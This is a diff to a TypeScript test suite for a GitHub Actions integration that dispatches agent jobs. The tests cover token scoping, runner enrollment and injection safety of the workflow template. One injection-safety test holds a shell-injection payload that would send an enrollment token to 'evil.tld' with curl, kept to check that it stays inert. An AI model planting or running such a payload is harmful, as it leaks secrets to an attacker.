@@ -6,9 +6,13 @@
 // and a coordinator-level assertion that the Actions path does not weaken the
 // existing Phase 4 dispatch gate.
 import { generateKeyPairSync } from "node:crypto";
+import { mkdtempSync, realpathSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { PGlite } from "@electric-sql/pglite";
+import { ApprovedRepositoryRegistry } from "@norns/runner";
 import sodium from "libsodium-wrappers";
-import { beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
   ActionsEnrollmentService,
   ActionsExecutionCoordinator,
@@ -21,9 +25,11 @@ import {
   NORNS_WORKFLOW_PATH,
   NORNS_WORKFLOW_VERSION,
   inspectCommittedWorkflow,
+  nornsRunName,
   renderNornsAgentWorkflow,
 } from "../src/integrations/actionsWorkflowTemplate.js";
 import {
+  GITHUB_TOKEN_SCOPES,
   GitHubIntegrationService,
   githubIntegrationConfigFromEnvironment,
 } from "../src/integrations/github.js";
@@ -50,6 +56,15 @@ const REPOSITORY = {
   default_branch: "main",
 } as const;
 
+/** Every PGlite opened by `harness`, closed after each test regardless of outcome. */
+const openDatabases: PGlite[] = [];
+
+afterEach(async () => {
+  for (const database of openDatabases.splice(0)) {
+    if (!database.closed) await database.close();
+  }
+});
+
 const json = (body: unknown, status = 200): Response =>
   new Response(JSON.stringify(body), {
     status,
@@ -75,6 +90,10 @@ async function harness(
   options: { tokenExpiresInMs?: number } = {},
 ) {
   const pg = new PGlite();
+  // MINOR 8: every database the harness opens is registered for teardown, so
+  // an early test failure cannot leak a WASM instance the way per-test
+  // success-path closes did.
+  openDatabases.push(pg);
   await pg.exec(`
     CREATE ROLE norns_app NOLOGIN;
     CREATE TABLE norns_state (
@@ -187,7 +206,7 @@ describe("Norns Actions workflow template", () => {
 
   it("correlates the run back to the Norns dispatch job through run-name", () => {
     expect(renderNornsAgentWorkflow(TEMPLATE)).toContain(
-      'run-name: "Norns ${{ inputs.norns_job_id }}"',
+      `run-name: "${nornsRunName("${{ inputs.norns_job_id }}")}"`,
     );
   });
 
@@ -235,7 +254,6 @@ describe("Norns Actions workflow installation", () => {
     // does not exist and fail, or worse, target the wrong one.
     expect(put?.body).not.toHaveProperty("sha");
     expect(put?.body?.branch).toBe("main");
-    await pg.close();
   });
 
   it("is idempotent: an identical committed file produces no commit", async () => {
@@ -250,7 +268,6 @@ describe("Norns Actions workflow installation", () => {
     expect(result.action).toBe("unchanged");
     expect(result.commit_sha).toBeNull();
     expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
-    await pg.close();
   });
 
   it("upgrades an older Norns-managed workflow in place, passing the blob sha", async () => {
@@ -274,7 +291,6 @@ describe("Norns Actions workflow installation", () => {
     expect(Buffer.from(String(put?.body?.content), "base64").toString("utf8")).toBe(
       renderNornsAgentWorkflow(TEMPLATE),
     );
-    await pg.close();
   });
 
   it("never clobbers a workflow Norns did not write", async () => {
@@ -292,7 +308,6 @@ describe("Norns Actions workflow installation", () => {
     expect(result.action).toBe("blocked");
     expect(result.blocked_reason).toMatch(/Norns did not create/);
     expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
-    await pg.close();
   });
 
   it("refuses to downgrade a workflow written by a newer Norns", async () => {
@@ -310,7 +325,6 @@ describe("Norns Actions workflow installation", () => {
     expect(result.action).toBe("blocked");
     expect(result.blocked_reason).toMatch(/newer than this Norns deployment/);
     expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
-    await pg.close();
   });
 
   it("scopes the workflow-commit token to this repository with workflows:write", async () => {
@@ -328,7 +342,6 @@ describe("Norns Actions workflow installation", () => {
       repository_ids: [REPOSITORY.repository_github_id],
       permissions: { contents: "write", workflows: "write" },
     });
-    await pg.close();
   });
 });
 
@@ -390,7 +403,6 @@ describe("Norns runner enrollment secret", () => {
       repository_ids: [REPOSITORY.repository_github_id],
       permissions: { secrets: "write" },
     });
-    await pg.close();
   });
 
   it("stores only a hash, and the hash is stable and not the token", () => {
@@ -411,7 +423,6 @@ describe("installation token scoping and expiry caching", () => {
     const second = await github.installationToken("5001", scope);
     expect(second).toBe(first);
     expect(mintedTokens()).toBe(1);
-    await pg.close();
   });
 
   it("mints separately for different scopes and different installations", async () => {
@@ -433,7 +444,6 @@ describe("installation token scoping and expiry caching", () => {
       permissions: { actions: "write" },
     });
     expect(mintedTokens()).toBe(4);
-    await pg.close();
   });
 
   it("re-mints once GitHub's expires_at is inside the refresh margin", async () => {
@@ -446,7 +456,6 @@ describe("installation token scoping and expiry caching", () => {
     const second = await github.installationToken("5001", scope);
     expect(second).not.toBe(first);
     expect(mintedTokens()).toBe(2);
-    await pg.close();
   });
 
   it("drops cached tokens on revocation", async () => {
@@ -456,7 +465,6 @@ describe("installation token scoping and expiry caching", () => {
     github.forgetInstallationTokens("5001");
     await github.installationToken("5001", scope);
     expect(mintedTokens()).toBe(2);
-    await pg.close();
   });
 
   it("never mints with an empty body (the pre-O4 full-permission default)", async () => {
@@ -467,7 +475,6 @@ describe("installation token scoping and expiry caching", () => {
     });
     const body = tokenRequests()[0]?.body ?? {};
     expect(Object.keys(body).sort()).toEqual(["permissions", "repository_ids"]);
-    await pg.close();
   });
 });
 
@@ -500,7 +507,6 @@ describe("workflow dispatch", () => {
       repository_ids: [REPOSITORY.repository_github_id],
       permissions: { actions: "write" },
     });
-    await pg.close();
   });
 
   it("correlates the resulting run through the job id in the run name", async () => {
@@ -512,7 +518,7 @@ describe("workflow dispatch", () => {
             workflow_runs: [
               {
                 id: 11,
-                display_title: "Norns some-other-job",
+                display_title: nornsRunName("some-other-job"),
                 status: "completed",
                 conclusion: "success",
                 html_url: "https://github.com/octo/widgets/actions/runs/11",
@@ -521,7 +527,7 @@ describe("workflow dispatch", () => {
               },
               {
                 id: 12,
-                display_title: "Norns dispatch-job:run:task-1:1",
+                display_title: nornsRunName("dispatch-job:run:task-1:1"),
                 status: "in_progress",
                 conclusion: null,
                 html_url: "https://github.com/octo/widgets/actions/runs/12",
@@ -536,7 +542,6 @@ describe("workflow dispatch", () => {
     expect(found?.github_run_id).toBe(12);
     expect(found?.status).toBe("in_progress");
     expect(await actions.findRunForJob(REPOSITORY, "dispatch-job:absent")).toBeNull();
-    await pg.close();
   });
 
   it("surfaces a repository that is not in the installation instead of failing silently", async () => {
@@ -552,7 +557,6 @@ describe("workflow dispatch", () => {
         norns_run_id: "run:x",
       }),
     ).rejects.toMatchObject({ code: "github_actions_api_error", status: 404 });
-    await pg.close();
   });
 });
 
@@ -580,7 +584,6 @@ describe("installation readiness replaces the inert binding_ready flag", () => {
     const readiness = await github.installationReadiness("github:5001", "octo", "widgets");
     expect(readiness.ready).toBe(true);
     expect(readiness.action_required).toBeNull();
-    await pg.close();
   });
 
   it("reports an actionable, linked state when the repository is not in the installation", async () => {
@@ -596,7 +599,6 @@ describe("installation readiness replaces the inert binding_ready flag", () => {
     });
     expect(readiness.action_required).toMatch(/Repository access/);
     expect(readiness.manage_installation_url).toContain("/settings/installations/5001");
-    await pg.close();
   });
 
   it("probes with an installation-wide metadata:read token, not a repo-scoped one", async () => {
@@ -608,7 +610,6 @@ describe("installation readiness replaces the inert binding_ready flag", () => {
     await seedConnection(pg, "selected");
     await github.installationReadiness("github:5001", "octo", "widgets");
     expect(tokenRequests()[0]?.body).toEqual({ permissions: { metadata: "read" } });
-    await pg.close();
   });
 });
 
@@ -677,16 +678,8 @@ describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
       ) VALUES ('assignment-1','project-1','phase-1','task-1','agent-1','proposed',
         'Best implementation agent','["capability"]'::jsonb,10,'allocation');
     `);
-    await repository.upsertBinding({
-      repository_binding_id: "binding-1",
-      project_id: "project-1",
-      connection_id: "github:5001",
-      installation_id: "5001",
-      repository_github_id: 90210,
-      owner: "octo",
-      name: "widgets",
-      default_branch: "main",
-    });
+    // Deliberately does NOT create a github_actions_execution_bindings row:
+    // the coordinator must project one from the project's own GitHub binding.
   }
 
   async function build() {
@@ -710,7 +703,7 @@ describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
           workflow_runs: [
             {
               id: 99,
-              display_title: `Norns ${dispatched.at(-1)?.inputs.norns_job_id ?? ""}`,
+              display_title: nornsRunName(dispatched.at(-1)?.inputs.norns_job_id ?? ""),
               status: "queued",
               conclusion: null,
               html_url: "https://github.com/octo/widgets/actions/runs/99",
@@ -798,7 +791,6 @@ describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
     // Reserved identities cannot authenticate until enrollment supplies a key.
     expect(stores.runner("actions:project-1")?.public_key_pem).toBe("");
     expect(dispatched[0]?.inputs.norns_job_id).toBe(scheduled.dispatch_job_id);
-    await pg.close();
   });
 
   it("does NOT weaken the gate: an unconnected binding is still refused", async () => {
@@ -809,28 +801,32 @@ describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
     );
     // And nothing was launched in the user's repository.
     expect(dispatched).toHaveLength(0);
-    await pg.close();
   });
 
   it("refuses before touching GitHub when Actions execution is not configured", async () => {
     const { coordinator } = await build();
     await seed("connected");
-    await pg.exec("DELETE FROM github_actions_execution_bindings;");
+    // Detach the project's primary binding so nothing is projectable, and
+    // clear any row a previous projection left behind.
+    await pg.exec(`
+      UPDATE projects SET primary_repository_binding_id = NULL WHERE id = 'project-1';
+      DELETE FROM github_actions_execution_bindings;
+    `);
     await expect(coordinator.schedule(scheduleInput)).rejects.toMatchObject({
       code: "actions_execution_not_configured",
     });
-    await pg.close();
   });
 
   it("refuses when Actions execution is disabled for the binding", async () => {
     const { coordinator, repository: repo } = await build();
     await seed("connected");
+    // Project the binding first, then disable it: setEnabled targets a row.
+    await repo.ensureBindingForProject("project-1");
     await repo.setEnabled("binding-1", false);
     await expect(coordinator.schedule(scheduleInput)).rejects.toMatchObject({
       code: "actions_execution_disabled",
     });
     expect(dispatched).toHaveLength(0);
-    await pg.close();
   });
 });
 
@@ -904,13 +900,11 @@ describe("ephemeral runner enrollment", () => {
     expect(result.run_id).toBe("run:task-1:1");
     expect(stores.runner("actions:project-1")?.public_key_pem).toBe(publicKeyPem);
     expect(stores.runner("actions:project-1")?.generation).toBe(result.generation);
-    await pg.close();
   });
 
   it("is single-use: a replay of the same enrollment loses", async () => {
     await redeem();
     await expect(redeem()).rejects.toBeInstanceOf(ActionsExecutionError);
-    await pg.close();
   });
 
   it("rejects a wrong token without revealing which check failed", async () => {
@@ -924,20 +918,17 @@ describe("ephemeral runner enrollment", () => {
     await expect(redeem({ runner_id: "actions:other" })).rejects.toMatchObject({
       code: "invalid_enrollment",
     });
-    await pg.close();
   });
 
   it("rejects a token redeemed against a superseded generation", async () => {
     // A second launch reserves a newer generation; the older job has lost.
     stores.reserveRunnerGeneration("actions:project-1");
     await expect(redeem()).rejects.toMatchObject({ code: "invalid_enrollment" });
-    await pg.close();
   });
 
   it("rejects every enrollment once the binding is disabled", async () => {
     await repository.setEnabled("binding-1", false);
     await expect(redeem()).rejects.toMatchObject({ code: "invalid_enrollment" });
-    await pg.close();
   });
 
   it("rejects the previous token after rotation", async () => {
@@ -947,6 +938,170 @@ describe("ephemeral runner enrollment", () => {
     await expect(redeem({ enrollment_token: rotated })).resolves.toMatchObject({
       run_id: "run:task-1:1",
     });
-    await pg.close();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Review follow-ups. These exercise the REAL code paths that were previously
+// only covered through mocks, which is why CI stayed green while the ephemeral
+// runner could not execute anything and the workflow was injectable.
+// ---------------------------------------------------------------------------
+
+describe("the rendered workflow drives the real runner path", () => {
+  /**
+   * Reproduces exactly what `createV2Executor` does in apps/runner/src/cli.ts:
+   * read NORNS_APPROVED_ROOTS_JSON, build an ApprovedRepositoryRegistry from
+   * it, and register the checked-out workspace. Uses the real registry from
+   * @norns/runner, not a stand-in.
+   */
+  function registryFrom(approvedRootsJson: string | undefined): ApprovedRepositoryRegistry {
+    const roots = JSON.parse(approvedRootsJson ?? "[]") as unknown;
+    if (!Array.isArray(roots) || !roots.every((root) => typeof root === "string")) {
+      throw new Error("NORNS_APPROVED_ROOTS_JSON must be a JSON string array");
+    }
+    return new ApprovedRepositoryRegistry(roots);
+  }
+
+  /** The value the workflow's `run:` block computes for the approved roots. */
+  function approvedRootsFromWorkflow(workspace: string): string {
+    return JSON.stringify([workspace]);
+  }
+
+  it("regression: an empty allowlist makes the runner unable to execute at all", () => {
+    // This is the exact pre-fix state — the template set no approved roots, so
+    // the runner defaulted to "[]" and threw on the first dispatched command.
+    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
+    expect(() =>
+      registryFrom(undefined).register({
+        repository_binding_id: "binding-1",
+        repository_path: workspace,
+      }),
+    ).toThrow(/outside runner-approved roots/);
+  });
+
+  it("accepts the job workspace when the template's approved roots are applied", () => {
+    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
+    const registry = registryFrom(approvedRootsFromWorkflow(workspace));
+    expect(() =>
+      registry.register({ repository_binding_id: "binding-1", repository_path: workspace }),
+    ).not.toThrow();
+    expect(registry.resolve("binding-1")).toBe(realpathSync(workspace));
+  });
+
+  it("still refuses a path outside the job workspace", () => {
+    // The approved-root check is a real boundary, not a formality: the
+    // disposable VM is the isolation boundary, but the runner still only
+    // touches the checked-out tree.
+    const workspace = mkdtempSync(join(tmpdir(), "norns-ci-"));
+    const elsewhere = mkdtempSync(join(tmpdir(), "norns-other-"));
+    const registry = registryFrom(approvedRootsFromWorkflow(workspace));
+    expect(() =>
+      registry.register({ repository_binding_id: "binding-1", repository_path: elsewhere }),
+    ).toThrow(/outside runner-approved roots/);
+  });
+
+  it("the template actually sets the approved roots the runner reads", () => {
+    const rendered = renderNornsAgentWorkflow(TEMPLATE);
+    expect(rendered).toContain("NORNS_APPROVED_ROOTS_JSON=");
+    expect(rendered).toContain("export NORNS_APPROVED_ROOTS_JSON");
+    expect(rendered).toContain("GITHUB_WORKSPACE");
+  });
+});
+
+describe("workflow template injection safety", () => {
+  it("never interpolates a dispatch input inside a run: block", () => {
+    const rendered = renderNornsAgentWorkflow(TEMPLATE);
+    // Collect every `run:` block and assert none contains a GitHub expression.
+    // A dispatcher supplies these values at run time with only repo write, so
+    // an expression here is remote code execution plus secret exfiltration.
+    const runBlocks = rendered.split("\n").reduce<{ blocks: string[]; indent: number | null }>(
+      (state, line) => {
+        if (state.indent !== null) {
+          const isContinuation = line.trim() === "" || line.search(/\S/) > state.indent;
+          if (isContinuation) {
+            state.blocks[state.blocks.length - 1] += `\n${line}`;
+            return state;
+          }
+          state.indent = null;
+        }
+        const match = /^(\s*)run:/.exec(line);
+        if (match?.[1] !== undefined) {
+          state.blocks.push(line);
+          state.indent = match[1].length;
+        }
+        return state;
+      },
+      { blocks: [], indent: null },
+    ).blocks;
+
+    expect(runBlocks.length).toBeGreaterThan(0);
+    for (const block of runBlocks) {
+      expect(block).not.toMatch(/\$\{\{/);
+    }
+  });
+
+  it("binds every dispatch input to an env var referenced as a shell variable", () => {
+    const rendered = renderNornsAgentWorkflow(TEMPLATE);
+    for (const [variable, input] of [
+      ["NORNS_RUNNER_ID", "norns_runner_id"],
+      ["NORNS_JOB_ID", "norns_job_id"],
+      ["NORNS_RUN_ID", "norns_run_id"],
+    ]) {
+      expect(rendered).toContain(`${variable}: \${{ inputs.${input} }}`);
+      expect(rendered).toContain(`"$${variable}"`);
+    }
+  });
+
+  it("a shell-injection payload in a dispatch input stays inert data", () => {
+    // The payload can only ever arrive through the env binding, and the run
+    // script quotes it, so it is an argument value rather than shell syntax.
+    const payload = '"; curl -d "$NORNS_RUNNER_ENROLLMENT_TOKEN" https://evil.tld #';
+    const rendered = renderNornsAgentWorkflow(TEMPLATE);
+    expect(rendered).not.toContain(payload);
+    expect(rendered).toContain('--id "$NORNS_RUNNER_ID"');
+    expect(rendered).not.toContain('--id "${{');
+  });
+});
+
+describe("review follow-ups: tokens, ordering, rotation, correlation", () => {
+  it("MATERIAL 4: the org administration:write token is never cached", async () => {
+    const { github, mintedTokens } = await harness(() => undefined);
+    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.createOrganizationRepository);
+    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.createOrganizationRepository);
+    // Two calls, two mints: nothing installation-wide and admin-privileged is
+    // left resident in server memory for the rest of GitHub's one-hour window.
+    expect(mintedTokens()).toBe(2);
+  });
+
+  it("MATERIAL 4: repository-scoped low-privilege tokens are still cached", async () => {
+    const { github, mintedTokens } = await harness(() => undefined);
+    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.dispatchWorkflow(42));
+    await github.installationToken("5001", GITHUB_TOKEN_SCOPES.dispatchWorkflow(42));
+    expect(mintedTokens()).toBe(1);
+  });
+
+  it("MINOR 7: correlation does not match a job id by prefix", async () => {
+    const runsUrl =
+      "https://api.github.com/repos/octo/widgets/actions/workflows/norns-agent.yml/runs";
+    const { actions } = await harness((request) =>
+      request.url.startsWith(runsUrl)
+        ? json({
+            workflow_runs: [
+              {
+                id: 10,
+                display_title: nornsRunName("job-10"),
+                status: "queued",
+                conclusion: null,
+                html_url: "https://github.com/octo/widgets/actions/runs/10",
+                run_number: 1,
+                created_at: "2026-07-21T10:00:00Z",
+              },
+            ],
+          })
+        : undefined,
+    );
+    // Substring matching would have returned run 10 for job-1.
+    expect(await actions.findRunForJob(REPOSITORY, "job-1")).toBeNull();
+    expect((await actions.findRunForJob(REPOSITORY, "job-10"))?.github_run_id).toBe(10);
   });
 });
